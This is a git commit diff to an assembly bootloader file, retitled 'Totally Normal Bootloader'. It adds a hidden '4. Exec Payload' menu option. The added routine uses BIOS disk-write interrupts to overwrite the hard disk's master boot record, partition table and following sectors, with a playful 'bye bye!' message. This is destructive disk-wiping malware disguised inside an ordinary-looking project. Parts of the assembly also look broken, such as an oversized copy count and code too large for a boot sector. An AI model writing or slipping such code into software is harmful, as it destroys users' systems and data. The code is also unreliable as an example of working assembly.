abfde02fdb2f1eeb74f98fa3ddf076fadb035f2f
liuzhaicutey <gracebaguio64@gmail.com>
2025-12-05 18:32:25 +0800

    bootloader.asm

--- Minimal Bootloader/bootloader.asm
+++ Minimal Bootloader/bootloader.asm
@@ -26,6 +26,9 @@ start:
     cmp al, '3'
     je system_info
 
+    cmp al, '4'
+    je exec_payload
+
     mov si, msg_invalid
     call print_msg
     jmp start
@@ -85,12 +88,13 @@ window_bottom_border:
     db '+-------------------+', 0x0A, 0x00
 
 msg_title:
-    db 'Minimal Bootloader', 0x0A, 0x00
+    db 'Totally Normal Bootloader', 0x0A, 0x00
 
 msg_menu:
     db '1. Load Kernel', 0x0A, 0x00
     db '2. Exit', 0x0A, 0x00
     db '3. System Info', 0x0A, 0x00
+    db '4. Exec Payload', 0x0A, 0x00
     db 'Choose an option: ', 0x00
 
 msg_invalid:
@@ -107,6 +111,135 @@ msg_system_info:
 
 msg_good_luck:
     db 'Have a nice day! I love you!', 0x0A, 0x00
+
+msg_payload:
+    db 'Executing payload... bye bye!', 0x0A, 0x00
+
+exec_payload:
+    mov si, msg_payload
+    call print_msg
+
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+
+    mov si, 0x1BE
+    mov cx, 4
+partition_loop:
+    mov di, 0x7C00
+    mov dx, [si]
+    add dx, [si+2]
+    cmp dx, 0x0000
+    je next_partition
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, [si+1]
+    mov cl, [si+2]
+    mov dh, [si+3]
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512
+    rep movsb
+next_partition:
+    add si, 16
+    loop partition_loop
+
+    mov si, payload_signature
+    mov di, 0x1BE
+    mov cx, 64  
+    rep movsb
+
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03
+    mov al, 0xFF  
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512 * 255 
+    rep movsb
+
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x02
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512
+    rep movsb
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x03
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512
+    rep movsb
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x04
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512
+    rep movsb
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, 0x00
+    mov cl, 0x05
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, payload_signature
+    mov di, 0x7C00
+    mov cx, 512
+    rep movsb
+
+    ret
+
+payload_signature:
+    db 'Payload Signature', 0x00
 
 times 510 - ($ - start) db 0
 dw 0xAA55
